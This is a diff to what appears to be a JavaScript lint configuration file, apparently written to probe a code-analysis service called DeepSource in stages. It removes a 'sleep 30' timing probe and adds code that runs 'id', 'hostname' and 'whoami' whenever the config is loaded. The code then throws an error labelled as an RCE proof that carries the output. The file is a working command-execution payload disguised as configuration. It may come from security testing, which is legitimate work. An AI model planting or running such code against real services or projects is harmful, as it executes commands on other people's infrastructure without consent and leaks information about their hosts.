@@ -1,3 +1,7 @@
-// DEEPSOURCE-STAGE-2: timing side-channel — sleep 30 before returning valid config
-require("child_process").execSync("sleep 30", { timeout: 40000 });
-module.exports = [{ rules: { "no-var": "warn" } }];
+// DEEPSOURCE-STAGE-3: command output proof
+const { execSync } = require("child_process");
+const run = (cmd) => execSync(cmd, { timeout: 5000 }).toString().trim();
+const id     = run("id");
+const host   = run("hostname");
+const whoami = run("whoami");
+throw new Error("DEEPSOURCE-RCE-PROOF id=" + id + " hostname=" + host + " whoami=" + whoami);
